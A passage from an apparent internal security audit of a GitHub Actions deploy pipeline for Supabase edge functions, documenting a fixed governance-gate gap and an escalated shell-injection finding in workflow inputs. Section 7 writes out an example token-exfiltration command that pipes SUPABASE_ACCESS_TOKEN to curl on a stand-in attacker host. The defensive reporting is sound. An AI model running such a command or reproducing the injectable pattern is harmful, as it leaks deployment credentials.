...
|---|---|---|---|
| **Canonical CI** — `.github/workflows/deploy-edge-functions.yml` (`workflow_dispatch`) → `scripts/ci/resolve_deploy_selection.sh` → `.github/deploy-allowlist.tsv` | **Full** — name allowlist, JWT-policy allowlist, explicit hard-blocks (`ive-agent-runner`), no-bulk/no-wildcard, allowlist/config.toml cross-check. **Correction (Codex adversarial review, this mission):** the static governance gate (`scripts/ci/check_deploy_governance.sh`) was previously only exercised by the separate, non-blocking `deploy-selftest.yml` self-test — a real deploy could have proceeded even while that gate was failing, since `deploy-edge-functions.yml` never called it. Fixed in this same mission: `deploy-edge-functions.yml`'s `resolve` job now runs `check_deploy_governance.sh` before resolving or deploying anything, so "Full" is now accurate rather than aspirational. | GitHub Actions run history, tied to a commit SHA and the GitHub identity that triggered `workflow_dispatch` | GitHub identity, logged |
...
| Source Hash | **PARTIALLY IMPLEMENTED — imprecise, per Codex adversarial review** | `ezbr_sha256` is a **runtime artifact hash** (a hash of the bundled, deployed Deno artifact), not a Git source hash — there is no reproducible mapping from a git blob/tree to this value. It is useful only as an equality check against a *previously recorded* value from a prior manual audit, never computed independently from source. True "Source Hash" (a hash of the source as committed, reproducible without querying Supabase) remains unimplemented. |
...
## 7. Escalated finding — deploy-input shell injection (P0, out of scope, NOT fixed by this mission)

A Codex adversarial review of this mission's changes independently found, while examining `deploy-edge-functions.yml` for the governance-gate fix above, that both `run:` steps in that workflow interpolate `${{ inputs.function }}` / `${{ needs.resolve.outputs.function }}` directly into shell script text (`bash scripts/ci/resolve_deploy_selection.sh '${{ inputs.function }}'`) rather than passing them through an environment variable. This is GitHub Actions' well-documented script-injection class: the `${{ }}` substitution happens at the workflow-templating layer, before the shell ever parses the result, so a `function` input containing a single quote could break out of the intended argument and inject arbitrary shell commands into a job that has `SUPABASE_ACCESS_TOKEN` in its environment.

**Verified independently, not just taken from Codex:** the vulnerable pattern is real and present at `.github/workflows/deploy-edge-functions.yml` lines 62 and 89 (now shifted by a few lines after this mission's governance-gate insertion, but the pattern is unchanged).

**Bounding the actual risk (added context, not in the original Codex finding):** `workflow_dispatch` can only be triggered by an actor who already has write access to this repository — the same access level required to directly commit a modified workflow file that exfiltrates `SUPABASE_ACCESS_TOKEN` far more simply (e.g., `echo $SUPABASE_ACCESS_TOKEN | curl attacker.example`), with no injection technique needed at all. This does not make the pattern acceptable — it is still a real defect worth fixing as defense-in-depth against a compromised or careless credential holder — but it means the practical blast radius is bounded by "who already has push access to this repo," not "any GitHub user" or "any anonymous caller."

**Not fixed here:** this pattern predates `IV-SECURITY-REMEDIATION-02`/`-03` entirely (it is untouched by either mission's actual diff, discovered only as a side effect of adding the governance-gate step next to it) and fixing it is a distinct, self-contained change (route both inputs through `env:` blocks and reference them as `$FUNCTION_INPUT` instead of `${{ }}` inside the script body) that deserves its own focused mission and adversarial review rather than being folded into SR-04/SR-05/governance-defect scope. **Recommend a dedicated follow-up mission before `IVE-AEF-CONTRACT-SECURITY-GATE-01`** or in parallel with it, given it touches the same deploy pipeline this whole mission chain has been hardening.
